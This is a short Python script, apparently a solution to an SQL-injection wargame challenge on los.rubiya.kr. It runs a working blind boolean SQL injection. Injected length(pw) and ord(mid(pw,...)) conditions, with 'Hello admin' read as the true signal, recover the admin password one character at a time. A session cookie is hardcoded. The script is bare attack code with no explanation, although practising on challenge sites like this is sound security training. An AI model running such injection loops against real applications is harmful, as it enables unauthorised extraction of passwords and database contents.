from urllib.request import urlopen
import urllib
import requests

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?"
session = dict(PHPSESSID = "6g7ncb5qgoqh53mb0vjtf0pn4b")

print ("! Start")

print ("! Find length of the password")

for i in range(0, 20):
	try:
		query = f"{url}pw='or length(pw)={i}%23"
		r = requests.post(query, cookies=session)
	except:
		print ("! Error")
		continue

	if 'Hello admin' in r.text:
		length = i
		break

print ("! Found length : ", length)

print ("! Find password")

for j in range(1, length + 1):
	for i in range(120, 255):
		try:
			query = f"{url}pw='or ord(mid(pw,{j},1))={i}%23"
			r = requests.post(query, cookies=session)
		except:
			print ("! Can't find")
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			print ("! pw " + str(j), ":", flag)
			break

print ("! Found pw : ", flag)
print ("! End")
